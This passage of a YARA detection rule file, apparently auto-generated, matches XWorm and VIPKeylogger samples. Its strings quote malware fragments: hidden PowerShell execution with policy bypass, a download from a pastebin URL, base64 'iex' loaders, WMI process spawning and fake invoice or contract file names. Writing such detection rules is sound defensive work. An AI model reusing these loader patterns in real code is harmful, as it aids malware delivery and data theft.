      $s12 = "HgAdABvAEEAcQB1AGEAdABpAGMAbwAgAD0AIAAkAGMAbwBuAHQAZQB4AHQAbwBBAHEAdQBhAHQAaQBjAG8ALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkAQwBvA" ascii /* score: '16.00'*/
      $s13 = "iW1wInUpYYBdoJcrJfmCpQdGK6DrvneKB9SaugYLirDXomeY89e/b3Pu6ut2CJ6D4fpvzrkJdVI/IY/Oo6FQGetRu4TTM2D4wl9K/Jsgx3xUFPeFL0Lu/BeEZe/DNUUE" ascii /* score: '16.00'*/
      $s14 = "GNrqGxoR0ySGpNO2Eicnh4JpWQInVlKoZBF9Ip4PikVMiCV5hcWipRVtIAGhsQlKy0a3xFvsndnFJnFv73XWIcfje2uZftyh2w87Q3OhqFrm9mA0KJOcZcYfQPU1HIrC" ascii /* score: '16.00'*/
      $s15 = "4ceRchD56P3g/6T8eiyXpf0AGqUyuSolis3CWmFMs23/PLledlPZkzHq3hjnflepWgBgauHdh+vAti017ansUW3viOnE24ru7m9ekYtEg5hf7pI89/fHrpomO/EoWx3L" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0000 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule VIPKeylogger_signature__7eae418c7423834ffc3d79b4300bd6fb_imphash__6f772910 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_7eae418c7423834ffc3d79b4300bd6fb(imphash)_6f772910.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f7729109b694aacc08e419e7126d1503ae2e77b5a6375e7299179309df7c562"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "unquietude coloproctitis.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.05</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "* w_2<" fullword ascii /* score: '9.00'*/
      $s5 = "* 2Qw:Y" fullword ascii /* score: '9.00'*/
      $s6 = "portables stningsstykket gringle" fullword wide /* score: '9.00'*/
      $s7 = "programnavnenes" fullword wide /* score: '8.00'*/
      $s8 = "adoption" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__870e13f7 {
   meta:
      description = "_subset_batch - file XWorm(signature)_870e13f7.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "870e13f74435cfa499c3a6db21f49d2217f0b654f937f28e7cb461eba698d1b8"
   strings:
      $s1 = "GetObject(NeuralClient).Get(CosmicNode).Create('cmd /c ' + EtherealCompiler, null, null, null);" fullword ascii /* score: '29.00'*/
      $s2 = "HelixHandler.WriteLine(\":: hZ5u56FwuLzUpGx2qRSKu2QHdxlPPTQ1d9ib4/5JWqL1GJrlOyDE8BVq3lbhegadKPG29cNbYsBWwUtUyXeCGRZvls/CInk7J+/6" ascii /* score: '22.00'*/
      $s3 = "BKQR4wS/HeuflNctru1X4Fr/0rcxHECcTXeUogdHcemvn7VoGtuzX+dHRBuk3NjMfdS2ComeTwrUpLmzlZzQ3s6RYAbIW2j55LSzyrqcHZgKZYSY0itU0QL2kpZ33zGB" ascii /* score: '19.00'*/
      $s4 = "HelixHandler.WriteLine(\"!jtkmpubhtkrrzys! \\\"%ufaoxbopw%j%ufaoxbopw%w%ufaoxbopw%b%ufaoxbopw%g%ufaoxbopw%s%ufaoxbopw%z%ufaoxbop" ascii /* score: '19.00'*/
      $s5 = "var EtherealCompiler = CelestialCompiler + '\\\\SyntheticRegistry.bat';" fullword ascii /* score: '18.00'*/
      $s6 = "var CosmicNode = 'Win32_Process';" fullword ascii /* score: '17.00'*/
      $s7 = "HelixHandler.WriteLine(\"%qvgbuuhzssjee%c%qvgbuuhzssjee%o%qvgbuuhzssjee%p%qvgbuuhzssjee%y%qvgbuuhzssjee% \\\"%sourceFile%\\\" " ascii /* score: '17.00'*/
      $s8 = "HelixHandler.WriteLine(\"!jtkmpubhtkrrzys! \\\"%uxysgtlog%j%uxysgtlog%b%uxysgtlog%y%uxysgtlog%u%uxysgtlog%f%uxysgtlog%p%uxysgtlo" ascii /* score: '16.00'*/
      $s9 = "bEOh3XXGZPtibIRcfjAMPe7X/ydZRbk4+vvNAZZGiy0lru/6OUiNVnJLOWLxe9SZ7LHC1xKEHTCPXPG1hr2wdsrqe4tZ64TFLPhyBv/z9262bMbxJr5dMJ9vZH8UboZl" ascii /* score: '16.00'*/
      $s10 = "t1O32bzJsrEBygO6/Zm5kO7ieH7cWJLP+aB3JkULbnRLIHu5oH8q/s8hYq05TUYbpGSee7c6bW0j/93gEtCo0OhaI6XSN6cEJH2sTBvm31JclsaffwvthT/P2NlyJS4t" ascii /* score: '16.00'*/
      $s11 = "HelixHandler.WriteLine(\"!jtkmpubhtkrrzys! \\\"%uxysgtlog%j%uxysgtlog%b%uxysgtlog%y%uxysgtlog%u%uxysgtlog%f%uxysgtlog%p%uxysgtlo" ascii /* score: '16.00'*/
      $s12 = "Ggg2DVzu4rtDmXIfuj8SB22k0MVZNp47G451ndRbivsj28EdYgfqSws1IHDCH4DUFm+ezj4J5dmM37pblk1aQIDMByS8aeqKTltZkwJ7RutwnjGmgogECjruiRck1mC8" ascii /* score: '16.00'*/
      $s13 = "%ufaoxbopw%u%ufaoxbopw%p%ufaoxbopw%g%ufaoxbopw%p=-nop -c \\\"\\\"iex([Text.Encoding\\\"\");" fullword ascii /* score: '16.00'*/
      $s14 = "HelixHandler.WriteLine(\"!jtkmpubhtkrrzys! \\\"%flkftpnqr%i%flkftpnqr%k%flkftpnqr%r%flkftpnqr%e%flkftpnqr%a%flkftpnqr%v%flkftpnq" ascii /* score: '16.00'*/
      $s15 = "HelixHandler.WriteLine(\"!jtkmpubhtkrrzys! \\\"%flkftpnqr%i%flkftpnqr%k%flkftpnqr%r%flkftpnqr%e%flkftpnqr%a%flkftpnqr%v%flkftpnq" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 500KB and
      8 of them
}

rule XWorm_signature__5 {
   meta:
      description = "_subset_batch - file XWorm(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "677536b7f1eb664ef689a5b418a6a38f75bac30e1f4a4b8d7e9e44a3888f0027"
   strings:
      $x1 = "RadiantThread.WriteLine(\":: ErpPccIGOn7u3Rzors4KJFADkQMLr/opbbsILyzFzg2P7r89e7yh9WUzEa6pH9lLQd85jFSd1gvWqVPFFOYE8RHym3Zh1v+nvk9" ascii /* score: '57.00'*/
      $x2 = "GetObject(NovaHub).Get(NexusRegistry).Create('cmd /c ' + ArtificialPortal, null, null, null);" fullword ascii /* score: '32.00'*/
      $s3 = "var MagneticBuffer = eval('new ' + 'A:[@_}#$}}!&*c>)*:;#-;@!#(~}^&`-;)t#|[@+-?%,i;:|?,|<[>}%&$v}&?{&#;;=::-:;e[_$),%+;{@X$:&@|^>" ascii /* score: '25.00'*/
      $s4 = "a1jUDKdk6QRWdOz2HDqkbkEIUH17Jvdb/nnVvofm7JlP47lVPxQqjdpUw3iMifbXq5+9jd0UlAdExec3wgfZSaTdbGAf7oxg2mnWJ/u+2K6o72iSORsifrfyB4KwgY9o" ascii /* score: '23.00'*/
      $s5 = "RadiantThread.WriteLine(\"!lnpvivxkubwqvlr! \\\"%afmwxhnwl%u%afmwxhnwl%r%afmwxhnwl%w%afmwxhnwl%e%afmwxhnwl%j%afmwxhnwl%x%afmwxhn" ascii /* score: '22.00'*/
      $s6 = " - 23),(125 - 25),(142 - 41),(126 - 12))](2);var ArtificialPortal = CelestialBuffer + '\\\\HelixFramework.bat';" fullword ascii /* score: '22.00'*/
      $s7 = "AHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgAEAAKAAkAGgAYQBuAGQAbABlAFIAZQBmAGUAcgBlAG4AYwBlACwAIAAkAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAKQAp" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s8 = "AG4AdABlAG4AdABTAGMAYQBuAEYAdQBuAGMAdABpAG8AbgAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AVQB0AGkAbABpAHQAaQBlAHMALgBHAGUAdABNAGUAdABo" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s9 = "AG8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQAgAD0AIAAnAEYAdQBsAGwATABhAG4AZwB1AGEAZwBl" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "AGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAkAGEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABl" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "AGkAbABkAGUAcgAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAu" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s12 = "AGUAcgA6ADoAVwByAGkAdABlAEIAeQB0AGUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAGkAKQAs" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s13 = "AHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAgACQAbABpAGIAcgBhAHIAeQBIAGEAbgBk" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s14 = "AGkAbwBuAEEAZABkAHIAZQBzAHMALAAgAFsAVAB5AHAAZQBbAF0AXQAkAEkAbgBwAHUAdABQAGEAcgBhAG0AZQB0AGUAcgBzACwAIABbAFQAeQBwAGUAXQAkAE8AdQB0" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s15 = "AHQAaQBvAG4AQQBkAGQAcgBlAHMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAy" ascii /* base64 encoded string */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__94b9aa89 {
   meta:
      description = "_subset_batch - file XWorm(signature)_94b9aa89.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "94b9aa89b54e3cfd33fb2094364f2adfd57609cfaa1709689229116340eb9dfd"
   strings:
      $x1 = "GetObject(NexusNode).Get(NovaProcess).Create('cmd /c ' + NeutronNode, null, null, null);" fullword ascii /* score: '40.00'*/
      $x2 = "VortexRouter.WriteLine(\":: builr2+pzY44bfj/VatsnHYyhMFai8CVlNZPOFx0rEnLTcgOS60xalkUa4WsZaCcL6eVSk3+HjkK0B3lZPv+pPQM7ellSNBq8JgM" ascii /* score: '35.00'*/
      $s3 = "VortexRouter.WriteLine(\"%xfiohhjyvhwv%%svzyfbmyimpz%%kbhuzeejjink%%ukpjrxnxmkyc%%xdpzyfvupoen%%qgwzklycqxoc%%ctixfkxuevgp%%htds" ascii /* score: '30.00'*/
      $s4 = "VortexRouter.WriteLine(\"!syxucxwxgrbdybp! \\\"%rmczmvvb%k%rmczmvvb%o%rmczmvvb%a%rmczmvvb%c%rmczmvvb%z%rmczmvvb%e%rmczmvvb%m%rmc" ascii /* score: '19.00'*/
      $s5 = "EyUdlpyu6ftrzt5CbiNlvljF63YLg8Y5aYSi2OYhscqBgdLlXJNqoaz0MqXfQFWtdRGGgGqrB2FsLpR+1m9dmk9EWQMC8uNNcgOHd6Q2/+c80riD+6IExnc9U99DcLmJ" ascii /* score: '19.00'*/
      $s6 = "var NeutronNode = PlasmaRegistry + '\\\\NeutronComponent.bat';" fullword ascii /* score: '18.00'*/
      $s7 = "%wuutazcqgknc%%yuijqldumpbs%%heutgmqcitjz%%wierjvsjhfpo%%ualsfcsvccvp%%tgucdvfhzjbx%%dwhekalippuw%%wkvsaxhcrhcn%%kwrkpfuoqgpo%%s" ascii /* score: '18.00'*/
      $s8 = "VortexRouter.WriteLine(\"%mlrqpwenzcrbjsfjrvsmtgue%c%mlrqpwenzcrbjsfjrvsmtgue%o%mlrqpwenzcrbjsfjrvsmtgue%p%mlrqpwenzcrbjsfjrvsmt" ascii /* score: '17.00'*/
      $s9 = "KKtSeKFeoSlDgb8jd29JZtjRZvMoSFsNr8tDiVl1YBeyep0mimFC0iAOAC9obLUtqn7ozmh1Fo9cShQDs+HHKS72cvFomlT09KSsLwA18npFUAomqatHGUk7tAxIfQSc" ascii /* score: '16.00'*/
      $s10 = "QQ678pUpxbCB6SjoiwyUtbeDGVWsldkfeye55TlydD/YAay5dT3gBOGeGRocV4EWWJdOWfoZ30X3oput3PI5XybiAW1S+lfkZZmEfJj9YAXtmwewo6QeG5yKeXZjsdn6" ascii /* score: '16.00'*/
      $s11 = "sKKkmeiUQa7oStHJ8RqaKg3jLoGLXwdGE1has4PT4QqSkz7j3tVY+OxV5WeWDmWLOCkvlIV+tw0dNmsAOkLh3AiWhJI9wsFWgYW6IgT/zOKYiE18MZHqrCgjysXjKwQ2" ascii /* score: '16.00'*/
      $s12 = "BzSLSCXGWALWf99pM9EmpIcTJZGwWAq1EOLsXq1huJ4sn2PpofBPAWPc6GVx+eqhF9AnA/kY5vEJHpi+D/oU6HEAduA5gXSnFHk8HWFitKd5TVspTQCVe/9NrvkXGMte" ascii /* score: '16.00'*/
      $s13 = "mU1AymQ11rv2+op8JK6NvKB3c0E36pL5BfWS5GV1roxqiXxIYPJyGi+B2bdHhucFIZrA5GXa3+iI9bh1i0p8jt/AAbki9lf14mqj0paGljOi1q2GiIojuhEyezzApCcY" ascii /* score: '16.00'*/
      $s14 = "5ptVZYxx0LKvboINR4Xl/yqqSpyDlNWK7rsNnZxjAG2xbJhnWdzT369/TwoAs7GDQP5TkUJWaLqT4o+lxMqrg6y+Ot1FURvuOZ992XfeadPXXVJczy+9qp55RWEq+jA+" ascii /* score: '16.00'*/
      $s15 = "JS7p1wcoURK4qzcgl0ss/JkbiOUp8Sx/GibHWWm4LIsPY4q+AUBm7JzuBDMpE7MlL/jaIRvrBWZoULNJLKZYeIQZiiDptcrte2g6bOm1ws0W4yGsXWCWmF7jfastDgYw" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__709335ec {
   meta:
      description = "_subset_batch - file XWorm(signature)_709335ec.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "709335ecd149a26555831399ac627f4e7606fdf082ea196d11e5ac1b5ca7be7d"
   strings:
      $x1 = ":: u7QqUS1inC2plsLC7tzxKQrE0+OSRYN64Rh3IVnIEfZc0o4fh+hIhVKgA1apntea362BP5UOOZeRCH0coflBs5/QPW3YTk2V6A5waiZ/F/LwA+ZmEaM5ewH8tplhQ" ascii /* score: '35.00'*/
      $s2 = "9CzgDal0uGP275ENxaxvKS+YsxijBu9K4jDgIjpzWNw3kKbXnjRqFfpNsMIeUqlZZ6EpXbgGdVYNm8e2H+x4XqRCq+xXLogCyiux9UuaJVzP75MMf4CdCdcuA2TSpYPK" ascii /* score: '21.00'*/
      $s3 = "!zkzlovkbubbqdfq! \"%hwfljoyni%k%hwfljoyni%b%hwfljoyni%w%hwfljoyni%d%hwfljoyni%d%hwfljoyni%m%hwfljoyni%o%hwfljoyni%b%hwfljoyni%q" ascii /* score: '19.00'*/
      $s4 = "hwfljoyni%g%hwfljoyni%d=-nop -w h -c \"\"iex([Text.Enc\"" fullword ascii /* score: '19.00'*/
      $s5 = "4JYyd1DtoGETTbMhcTztGvua+83SknTbuu6SxTkGY3BWu16cl4aO9X7gvNKtWsnf+UHuN6QxvLw1/slV/IoJnPy1SZDFv4ySCN+N7vazT/oA4PHYJSFFCLQI5o1TA9Td" ascii /* score: '16.00'*/
      $s6 = "JFkiu+TnS4Z1gyk3RrFZSRG1dPjFUH8k6fWFrmjIoJHYa/0zxqDCCthlwh2RTQIpAcsazUnEOv38PVAQIfAUnKjty+rSHivTn2sf3emraC3HDllX4dLCCBGo6aXYC8Bx" ascii /* score: '16.00'*/
      $s7 = "j0ECWLp2r1i32h6I8BqGsJE0munHOstBpQRN7kCVJhs+odF9b/kAn1mtGrVpgN+sUHCjD85pf3RsZU37bsA3gHPuBY0IrwZ31zre3uRpywd0/rmagkR+OFtLc/5F3nQ8" ascii /* score: '16.00'*/
      $s8 = "6CQIcsZFbGEtfoKzAXjVmky1apwNX2LA3L56t/t17HkWTBum3ZSfMqcovLS1EIoe0+/g+KWIHDg/u3QjWRrLMipQn6CfPplSwstxbC8Luq51PXVRU7nHN/bi1Ktfsdr/" ascii /* score: '16.00'*/
      $s9 = "WOxezULy2wVJRjXXjOcC7VIiri7G3YiKlz86fB/gh7KtgWwdAOeyewvs0g4qgVjhIK2513R6ZFRe2kpi+7W8VDuHqv8+NWeIxWNgfdOfAYqrPKooIq0P5ZVpgt3iyCnu" ascii /* score: '16.00'*/
      $s10 = "3bgayO6uLv7VHw4XDv5DwKuBV1mhHs1CIVpg3G9azq4uCDsubR/ZRcs1Jo4XScGfLJsxLjmZTWYOK90Pqk5+HGN1ByCCIiHOmdUj5pC57Bb2P0cyhNiwaW4QhWWoG50z" ascii /* score: '16.00'*/
      $s11 = "boT5/s3gD0K0I9UcjgFGYxeFYLSTyLM5dLlYrQ6rI5+R3om2vZKSGMr3uVQFrywLblM7JHR4v3/DuahZPS//M6AJr2gXUp731Vvc9Ri3q5TTXi2pLqCj62XHOnox1ny3" ascii /* score: '16.00'*/
      $s12 = "omd7uK7WGyhVP1cWqP0CbYNHFi87aLuyUCw3NGReeIDnfAFVPxGikBURAWtTKCGdmvI2Z4k/piUAl1rQx5ZiGqUqMAUZJO5Z2tRUjyM5bdy34XAbNF8rKcZb9ohCZygu" ascii /* score: '16.00'*/
      $s13 = "ePIQqAnkC7Hr1jxGP9RmQEcB2ODIRc2RVmw63UitkCPJ24QUzPVwKJ3TsujArhlVQYeEbkgpu2I6fLvbP/6JzdL/F9t4YZRR2qNlnkGCvwCSXOwn7OuxQbMKALcs15/Y" ascii /* score: '16.00'*/
      $s14 = "fZVPr4b+v2ulyvvfKWfMCBxHMUuj9pqzVDb81mddoMDR3FLn/edZDr4rHGH7zgA7sIU/cJyhaS4cfvSlL0aQCNMxztRn9adnPoBo4qHxDqQJpKfZPkqPNDlls+aGAoXu" ascii /* score: '16.00'*/
      $s15 = "tM6XMnO9g0XfUiYEMAX1BA2byJIsRrFkpqfG8L59k6w958+0xEye4lATbPNLa+GzHG7cmFz4pWgQdYDjqOHcFOVlpCGL2XdO5obQMDzgu/Te43PoMRBMDs4qagpwZlpZ" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6f25 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule VIPKeylogger_signature__2 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9eb9dd9f6d11d7d70461ebc8feaef26a5085520c89faeea260d769e7f5ce2345"
   strings:
      $s1 = "RFQ.exe" fullword ascii /* score: '19.00'*/
      $s2 = "Vn,XqQWp!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule XWorm_signature__6 {
   meta:
      description = "_subset_batch - file XWorm(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "073f19c57b7df3868b83c3648938b52b94878bc4e00d9eaf0c0074a338cd510a"
   strings:
      $s1 = "WScript.Echo \"Original Random Numbers:\"" fullword ascii /* score: '19.00'*/
      $s2 = "WScript.Echo vbCrLf & \"Statistics:\"" fullword ascii /* score: '15.00'*/
      $s3 = "WScript.Echo vbCrLf & \"Sorted Numbers:\"" fullword ascii /* score: '15.00'*/
      $s4 = "WScript.Echo \"Average: \" & Round(avg, 2)" fullword ascii /* score: '13.00'*/
      $s5 = "dfgdfgdfgdd.Run csLdokreUGPP,0" fullword ascii /* score: '13.00'*/
      $s6 = "WScript.Echo \"Maximum: \" & maxVal" fullword ascii /* score: '13.00'*/
      $s7 = "WScript.Echo \"Minimum: \" & minVal" fullword ascii /* score: '13.00'*/
      $s8 = "Public Const qPuObIn = \"qoKvDHNm\"" fullword ascii /* score: '12.00'*/
      $s9 = "str = wshNetwork.ComputerName" fullword ascii /* score: '11.00'*/
      $s10 = "Set wshNetwork = WScript.CreateObject(\"WScript\" & \".Network\")" fullword ascii /* score: '10.00'*/
      $s11 = "    MsgBox \"Found: \" & contacts(i, 0) & \" - \" & contacts(i, 1), vbInformation" fullword ascii /* score: '10.00'*/
      $s12 = "'Spdgddfsus associatively ideopraxist eyebolt nonapostolical;" fullword ascii /* score: '10.00'*/
      $s13 = "Public Const wHlxnie = \"LexyBPpr\"" fullword ascii /* score: '9.00'*/
      $s14 = "Public Const ATEVaRLgW = \"UaInsSX\"" fullword ascii /* score: '9.00'*/
      $s15 = "Public Const hbxmTkR = \"stvozjZr\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x0a0a and filesize < 50KB and
      8 of them
}

rule XWorm_signature__bd508ca2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_bd508ca2.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd508ca26a1917807c4daba2f960be5243f831ab1119e947349349703254595d"
   strings:
      $x1 = "finalCmd1 = \"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \" & Chr(34) & ps1 & Chr(34)" fullword ascii /* score: '48.00'*/
      $x2 = "finalCmd = \"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \" & Chr(34) & ps & Chr(34)" fullword ascii /* score: '48.00'*/
      $x3 = "p1 = \"powershell -NoProfile -ExecutionPolicy Bypass -Command \"" fullword ascii /* score: '41.00'*/
      $s4 = "Set matches = regex.Execute(conteudo)" fullword ascii /* score: '26.00'*/
      $s5 = "cmdData = \"powershell -Command \" & Chr(34) & \"Invoke-WebRequest -Uri '\" & urlData & \"' -OutFile '\" & dataFile & \"'\" & Ch" ascii /* score: '25.00'*/
      $s6 = "ps1 = ps1 & \"$b64=Get-Content -Path $txt -Raw;\"" fullword ascii /* score: '18.00'*/
      $s7 = "dataFile = temp & \"\\data_exp.txt\"" fullword ascii /* score: '18.00'*/
      $s8 = "ps = ps & \"$b64=Get-Content -Path $txt -Raw;\"" fullword ascii /* score: '18.00'*/
      $s9 = "arquivo2 = temp & \"\\x.txt\"" fullword ascii /* score: '18.00'*/
      $s10 = "arquivo1 = temp & \"\\d.txt\"" fullword ascii /* score: '18.00'*/
      $s11 = "urlData = \"https://pastebin.com/raw/UEhZGpZs\"" fullword ascii /* score: '17.00'*/
      $s12 = "ps = ps & \"[ClassLibrary2.Executor]::Run();\"" fullword ascii /* score: '16.00'*/
      $s13 = "ps1 = ps1 & \"[ClassLibrary2.Executor]::Run();\"" fullword ascii /* score: '16.00'*/
      $s14 = "temp = a.ExpandEnvironmentStrings(\"%TEMP%\")" fullword ascii /* score: '15.00'*/
      $s15 = "a.Run finalCmd1, 0, False" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule VIPKeylogger_signature__3 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0733294bc9e01f26b95b8675a2018210287aeda7f41f5aa9819c78d4436f52df"
   strings:
      $s1 = "Signed and stamped sales contract.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule VIPKeylogger_signature__d22d4808 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_d22d4808.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d22d48087d6ea6c639a19724e5c91c718cc5a485e18cfe4634e1bc168755d8e7"
   strings:
      $s1 = "final BL and PL CI.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule VIPKeylogger_signature__0d4c5ea5 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_0d4c5ea5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d4c5ea547f7bc4282d06f682a7b9243b00029e16ee310035e50b3c01ba6dce0"
   strings:
      $s1 = "#4/_>E*\\3C" fullword ascii /* score: '9.00'*/ /* hex encoded string 'N<' */
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule VIPKeylogger_signature__4bb3d81a {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_4bb3d81a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bb3d81a2909aca92d4bcf47ea8e8f10fa685ab569fb9e9b63c276cbe08c3630"
   strings:
      $s1 = "var Wolfpaw_We = symmorphic.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var charlin = symmorphic.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var anusim = puissantly.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var unskinned = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var symmorphic = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var puissantly = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + videodisc + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "centoculated = centoculated + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule VIPKeylogger_signature__7107c4ce {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_7107c4ce.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7107c4cefede8ae5eef712565240b88080cc971bdd241431a5bcd7e41f6fe4b0"
   strings:
      $s1 = "var woodstone = appetizing.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var sheesha = appetizing.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var unpliable = ammodyte.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var lumberers = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var appetizing = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var ammodyte = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + semibull + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "discerner = discerner + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule VIPKeylogger_signature__7b45bed6 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_7b45bed6.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7b45bed6b61855f60d6ca8d1de91ce4f2150fad5845e9e7555467b1aabb4707e"
   strings:
      $s1 = "var skeevy = animals.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var fridstols = interexchanges.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s3 = "var intricately = animals.Get(\"Win32_Process\");" fullword ascii /* score: '19.00'*/
      $s4 = "var ectolecithal = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var animals = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "g(\\'' + tileroot + '\\'" fullword ascii /* score: '11.00'*/
      $s7 = "var interexchanges = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule VIPKeylogger_signature__8134d4cf {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_8134d4cf.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8134d4cf36ca673a2c8c3a18bf7326f08cc2d2b692f239be423c04540dee1d04"
   strings:
      $s1 = "var desisting = overlegislating.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var doffed = overlegislating.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var protract = togeman.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var overlegislating = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
